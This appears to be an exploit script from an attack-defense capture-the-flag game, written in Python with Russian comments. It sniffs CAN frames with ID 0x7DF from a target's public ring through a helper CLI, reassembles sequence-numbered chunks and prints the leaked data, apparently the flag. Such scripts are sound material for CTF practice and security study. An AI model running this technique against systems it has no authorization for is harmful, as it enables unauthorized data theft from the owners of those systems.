#!/usr/bin/env python3
"""vuln 2: кадры 0x7DF в публичном кольце. attack data = base_seq:chunks (hex)."""
from lib import CLI, args, emit, fail

host, meta = args(1)
base, count = (int(x, 16) for x in meta.split(":"))
chunks = {}
with CLI(host) as cli:
    for _ in range(8):
        for line in cli.cmd("can_sniff 1", multi=True):
            p = line.split()
            if len(p) == 3 and p[0] == "FRAME" and p[1] == "7DF":
                d = bytes.fromhex(p[2])
                chunks[d[0]] = d[1:]
        if all((base + i) % 256 in chunks for i in range(count)):
            break
missing = [i for i in range(count) if (base + i) % 256 not in chunks]
if missing:
    fail("нет чанков %s из %d" % (missing, count))
emit(b"".join(chunks[(base + i) % 256] for i in range(count)).rstrip(b"\0").decode("utf-8", "replace"))
